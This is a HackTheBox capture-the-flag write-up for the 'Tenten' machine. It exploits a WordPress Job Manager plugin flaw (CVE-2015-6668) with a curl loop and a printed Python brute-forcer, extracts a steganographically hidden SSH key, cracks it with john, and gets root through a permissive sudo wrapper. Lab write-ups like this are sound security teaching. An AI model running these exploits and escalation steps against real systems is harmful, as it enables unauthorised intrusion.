---
title: HTB: Tenten
url: https://0xdf.gitlab.io/2020/07/14/htb-tenten.html
date: 2020-07-14T21:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-tenten, ctf, nmap, wordpress, wpscan, gobuster, wp-job-manager, cve-2015-6668, python, steganography, steghide, ssh, john, sudo, mysql
---

![Tenten](https://0xdfimages.gitlab.io/img/tenten-cover.png)

Tenten had a lot of the much more CTF-like aspects that were more prevalent in the original HTB machine, like a uploaded hacker image file from which I will extract an SSH private key from it using steganography. I learned a really interesting lesson about wpscan and how to feed it an API key, and got to play with a busted WordPress plugin. In Beyond Root I’ll poke a bit at the WordPress database and see what was leaking via the plugin exploit.

## Box Info

| Name | [Tenten](https://hackthebox.com/machines/tenten)  [Tenten](https://hackthebox.com/machines/tenten) [Play on HackTheBox](https://hackthebox.com/machines/tenten) |
| --- | --- |
| Release Date | 22 Mar 2017 |
| Retire Date | 26 May 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Tenten |
| Radar Graph | Radar chart for Tenten |
| First Blood User | 21 days03:51:56[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 21 days03:51:42[vagmour vagmour](https://app.hackthebox.com/users/82) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.10
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 17:38 UTC
Nmap scan report for 10.10.10.10
Host is up (0.0020s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.10
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 17:39 UTC
Nmap scan report for 10.10.10.10
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is running Ubuntu 16.04 Xenial.

### Website - TCP 80

#### Site

The site is a WordPress “Job Portal” site:

[![](https://0xdfimages.gitlab.io/img/image-20200713233032543.png)](https://0xdfimages.gitlab.io/img/image-20200713233032543.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200713233032543.png)

There’s only one post, “Hello world!”, posted by Takis:

![image-20200713140940510](https://0xdfimages.gitlab.io/img/image-20200713140940510.png)

There’s a comment on the post, but it looks like the sample WordPress comment:

![image-20200713141013629](https://0xdfimages.gitlab.io/img/image-20200713141013629.png)

Just above the post, there’s a link for “Job Listing”. Clicking on it goes to `http://10.10.10.10/index.php/jobs/`, where there is a job listing for a Pen Tester:

![image-20200713233059264](https://0xdfimages.gitlab.io/img/image-20200713233059264.png)

Clicking Apply Now leads to a form, with a field to upload a resume:

![image-20200713233119231](https://0xdfimages.gitlab.io/img/image-20200713233119231.png)

I submitted, and kicked it over to Burp Repeater and tried different file types. It seems to block upload based on file extension, and not by mime type or content-type header. It allowed `.png`, `.docx`, and `.pdf`. It didn’t allow `.php`, `.ph3`, or `.aaaaaaa` (that last of which suggests it’s got an extension allow list).

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP (WordPress):

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~]                                                        
└──╼ $gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x php
===============================================================                 
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                               
===============================================================                   
[+] Url:            http://10.10.10.10                                                 
[+] Threads:        40
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1                                                     
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/13 18:08:23 Starting gobuster
===============================================================
/wp-content (Status: 301)                                                              
/wp-login.php (Status: 200)
/wp-includes (Status: 301)
/index.php (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/wp-signup.php (Status: 302)
/server-status (Status: 403)
===============================================================                    
2020/07/13 18:10:31 Finished
=============================================================== 

```

Nothing here that jumps out as non-WordPress related.

#### wpscan

I’ll also run `wpscan --url http://10.10.10.10 -e ap,t,tt,u`. The output is long, but I’ll highlight interesting bits. The theme is twentyseventeen:

```

[+] WordPress theme in use: twentyseventeen                
 | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-03-31T00:00:00.000Z                  
 | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
 | Style Name: Twenty Seventeen                            
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team                              
 | Author URI: https://wordpress.org/                      
 |                                                         
 | Found By: Css Style In Homepage (Passive Detection)
 |                                                         
 | Version: 1.1 (80% confidence)                           
 | Found By: Style (Passive Detection)                     
 |  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'  

```

There’s one plugin installed, `job-manager`:

```

[i] Plugin(s) Identified:

[+] job-manager                                            
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |                                                         
 | Found By: Urls In Homepage (Passive Detection)
 |                                                         
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt  

```

This is likely related to the job application form I found earlier.

There’s one identified user that I already identified, takis:

```

[i] User(s) Identified:

[+] takis
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)  

```

It turns out that there are vulnerabilities in here, both in the theme and the plugin, but that the current version of `wpscan` requires an API key to get vulnerability info from [wpvulndb.com](https://wpvulndb.com/). There’s a free tier that allows for up to 50 requests to the API per day. I registered and got an API key, saved it as an environment variable, and rescanned with `wpscan --url http://10.10.10.10 -e ap,t,tt,u --api-token $WPVULNDV_API_KEY`. It now identified 50 vulnerabilities in the core WordPress version. There were two that potentially leaked private posts, but in some quick playing I didn’t get either to do anything useful here. The rest were not particularly interesting. It did, however, identify the vulnerability in the plugin:

```

[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8167
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt

```

That would have saved me some time. This post continues as if I hadn’t found it.

## Shell as takis

### job-manager Plugin

#### Enumeration

While `wpscan` doesn’t report any vulnerabilities in the job-manager plugin, this site is job themed, and it’s the only plugin installed. Googling for `wordpress job-manager exploit`, the first result was [this link](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/). It is a vulnerability in the plugin up to and including version 0.7.25. `wpscan` is reporting version 7.2.5. That’s much higher, but also the same digits. I decided to dive in on the exploit and see if it worked.

#### Exploit Details

When this plugin stores things like an uploaded CV, it stores it in the same table as posts, just as private data. When this plugin loads, it is getting the title from item 8 in that table, which is in the url: `http://10.10.10.10/index.php/jobs/apply/8/`. By changing that number, I can leak post titles in the database (including draft and private posts). This information leak is CVE-2015-6668.

The job application page is `http://10.10.10.10/index.php/jobs/apply/8/`, and I see the title in two places:

![image-20200714115350755](https://0xdfimages.gitlab.io/img/image-20200714115350755.png)

If I change the `8` to a `1`, I get the title associated with the Hello World! post:

![image-20200714115312742](https://0xdfimages.gitlab.io/img/image-20200714115312742.png)

#### List Post Titles

I can isolate the post title field in the plugin page with `curl`, `grep`, and `cut`:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $curl -s http://10.10.10.10/index.php/jobs/apply/8/ | grep 'entry-title' | cut -d'>' -f2 | cut -d'<' -f1
Job Application: Pen Tester

```

On a clean reset of the box, it looks like there are 13 rows in the database:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $for i in $(seq 1 25); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'>' -f2 | cut -d'<' -f1; done
1: Job Application: Hello world!
2: Job Application: Sample Page
3: Job Application: Auto Draft
4: Job Application
5: Job Application: Jobs Listing
6: Job Application: Job Application
7: Job Application: Register
8: Job Application: Pen Tester
9: Job Application:
10: Job Application: Application
11: Job Application: cube
12: Job Application: Application
13: Job Application: HackerAccessGranted
14: Job Application
15: Job Application
16: Job Application
17: Job Application
18: Job Application
19: Job Application
20: Job Application
21: Job Application
22: Job Application
23: Job Application
24: Job Application
25: Job Application

```

I’ll compare this to the actual database in [Beyond Root](#beyond-root).

#### Find Files

The next step in the exploit it to find the file associated with the upload. The idea is that now that I know the name of the post (which for this plugin is the name of the applicant), I can find the associated resume uploads. The exploit site has a script to brute force looking for file paths that are based on upload date.

```

import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2018):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL

```

I changed the years to go through all of 2017, since that’s when Tenten retired.

Given that I have nothing else to work with, I’ll look for the file name `HackAccessGranted`:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $python brute.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10/
Enter a file name: HackerAccessGranted

```

It didn’t find anything. Given that I was able to upload images in addition to documents, I went in and added image extensions to the list to check, and on re-running, it got a hit:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $python brute.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10/
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10//wp-content/uploads/2017/04/HackerAccessGranted.jpg

```

The file is available at that URL:

![image-20200713152624679](https://0xdfimages.gitlab.io/img/image-20200713152624679.png)

### Extract Key with Steg

Given that the box spent all this way leading me to an image, and this is really old HTB where stuff like steg still rears its ugly head, I downloaded the file and tried `steghide`, and with no passphrase, it worked:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".

```

The file it wrote, `id_rsa` is an encrypted private key:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----

```

### Crack Key

I’ll use `ssh2john` to create a hash, and crack it with `john`:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $/usr/share/john/ssh2john.py id_rsa > id_rsa.john
┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $john id_rsa.john --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:06 DONE (2020-07-13 19:34) 0.1663g/s 2386Kp/s 2386Kc/s 2386KC/s *7¡Vamos!
Session completed

```

The password is “superpassword”.

### SSH as takis

Given I only have one user name at this point, I’ll try SSH as takis, and it returns a shell:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $chmod 400 id_rsa
┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $ssh -i id_rsa takis@10.10.10.10
The authenticity of host '10.10.10.10 (10.10.10.10)' can't be established.
ECDSA key fingerprint is SHA256:AxKIYOMkqGk3v+ZKgHEM6QcEDw8c8/qi1l0CMNSx8uQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.10' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.

Last login: Fri May  5 23:05:36 2017
takis@tenten:~$

```

I can grab `user.txt`:

```

takis@tenten:~$ cat user.txt
e5c7ed3b************************

```

## Priv: takis –> root

### Enumeration

Always check `sudo`, and it pays off again:

```

takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin

```

If I had a password for takis, I could run any command as sudo. But without a password, I can only run `/bin/fuckin`.

The file is a shell script:

```

takis@tenten:~$ file /bin/fuckin 
/bin/fuckin: Bourne-Again shell script, ASCII text executable

```

All it does is run the first arg, passing the second, third, and forth args in as args:

```

takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4

```

For example:

```

takis@tenten:~$ fuckin echo test
test
takis@tenten:~$ fuckin id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)

```

### Shell

So when run with `sudo`, it runs as root:

```

takis@tenten:~$ sudo fuckin id
uid=0(root) gid=0(root) groups=0(root)

```

So `sudo fuckin bash` gives a root shell:

```

takis@tenten:~$ sudo fuckin bash
root@tenten:~#

```

And I can grab `root.txt`:

```

root@tenten:/root# cat root.txt
f9f7291e************************

```

## Beyond Root

I wanted to come back with a shell and database access to look at what was actually going on in the WP plugin vulnerability. First, I needed the creds, which are in the `wp-config.php` file in `/var/ww/html`:

```

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'SuperPassword111');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```

I can connect with `mysql`:

```

takis@tenten:/var/www/html$ mysql -u wordpress -pSuperPassword111 wordpresss
...[snip]...
mysql>

```

Looking at the tables, the `wp_posts` table is there:

```

mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

```

Doing a `select *` will dump a ton of stuff, so I played with the columns to get the ones that would be most interesting and fit on one row per line:

```

mysql> mysql> select id,post_title,post_type,post_status,post_name,guid from wp_posts;
+----+---------------------+-----------------+-------------+---------------------+------------------------------------------------------------------------+
| id | post_title          | post_type       | post_status | post_name           | guid                                                                   |
+----+---------------------+-----------------+-------------+---------------------+------------------------------------------------------------------------+
|  1 | Hello world!        | post            | publish     | hello-world         | http://10.10.10.108/?p=1                                               |
|  2 | Sample Page         | page            | publish     | sample-page         | http://10.10.10.108/?page_id=2                                         |
|  3 | Auto Draft          | post            | auto-draft  |                     | http://10.10.10.108/?p=3                                               |
|  5 | Jobs Listing        | page            | publish     | jobs                | http://10.10.10.108/index.php/jobs/                                    |
|  6 | Job Application     | jobman_app_form | publish     | apply               | http://10.10.10.108/index.php/jobs/apply/                              |
|  7 | Register            | jobman_register | publish     | register            | http://10.10.10.108/index.php/jobman_register/register/                |
|  8 | Pen Tester          | jobman_job      | publish     | pen-tester          | http://10.10.10.108/index.php/jobs/pen-tester/                         |
|  9 |                     | nav_menu_item   | publish     | 9                   | http://10.10.10.108/?p=9                                               |
| 10 | Application         | jobman_app      | private     | application         | http://10.10.10.108/index.php/jobman_app/application/                  |
| 11 | cube                | attachment      | private     | cube                | http://10.10.10.108/wp-content/uploads/2017/04/cube.png                |
| 12 | Application         | jobman_app      | private     | application-2       | http://10.10.10.108/index.php/jobman_app/application-2/                |
| 13 | HackerAccessGranted | attachment      | private     | hackeraccessgranted | http://10.10.10.108/wp-content/uploads/2017/04/HackerAccessGranted.jpg |
+----+---------------------+-----------------+-------------+---------------------+------------------------------------------------------------------------+
12 rows in set (0.00 sec)

```

All of the titles are what I was able to leak out through this vulnerability:

```

┌─[htb-0xdf☺htb-rvrl5lfpiv]─[~/tenten]
└──╼ $for i in $(seq 1 25); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'>' -f2 | cut -d'<' -f1; done
1: Job Application: Hello world!
2: Job Application: Sample Page
3: Job Application: Auto Draft
4: Job Application
5: Job Application: Jobs Listing
6: Job Application: Job Application
7: Job Application: Register
8: Job Application: Pen Tester
9: Job Application:
10: Job Application: Application
11: Job Application: cube
12: Job Application: Application
13: Job Application: HackerAccessGranted

```

It’s interesting here is how WordPress jams together all these different types of “post”. Interesting the guid seems to show a url for the page, but the IP is wrong (maybe that’s the IP the box was created on?). There are all different types of post, like `post`, `page`, `nav_menu_item`, and then things associated with `jobman`, and `attachment`. The guids have `urls` that mostly work, though they have the wrong IP. I do see the guid for “HackerAccessGranted” points to the location where I found the image.

None of these posts have any actual content:

```

mysql> select post_content from wp_posts where id > 4;
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| post_content                                                                                                                                                                                                                            |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Hi! This page is used by your Job Manager plugin as a base. Feel free to change settings here, but please do not delete this page. Also note that any content you enter here will not show up when this page is displayed on your site. |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
|                                                                                                                                                                                                                                         |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
9 rows in set (0.00 sec)

```

It’s weird to me that this plugin uses the `wp_posts` table, rather than creating its own. But that also wouldn’t necessarily have prevented this vulnerability.